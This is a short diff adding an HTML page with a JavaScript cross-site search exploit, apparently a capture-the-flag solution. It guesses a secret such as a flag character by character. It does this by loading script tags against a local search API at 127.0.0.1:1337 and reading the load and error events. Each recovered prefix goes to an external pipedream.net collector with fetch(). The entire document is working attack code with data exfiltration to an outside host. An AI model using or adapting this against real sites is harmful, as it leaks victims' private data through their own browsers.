@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html>
+<body></body>
+<script>
+var chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-!{}_';
+var charLen = chars.length;
+
+function search(leak, charCounter) {
+    var x = document.createElement('script');
+    var curChar = chars[charCounter];
+
+    var curChar = chars[charCounter];
+
+    x.setAttribute("src", 'http://127.0.0.1:1337/api/entries/search?q=' + leak + curChar);
+    document.body.appendChild(x);
+    console.log("TRY: " + leak + curChar);
+    x.onload = () => {
+        leak += curChar
+        fetch("https://eoshhfon99qb65i.m.pipedream.net/" + leak)
+        search(leak, 0);
+    }
+    x.onerror = () => {
+        search(leak, (charCounter + 1) % chars.length);
+    }
+
+}
+search("HT", 0);
+
+</script>
+</html>
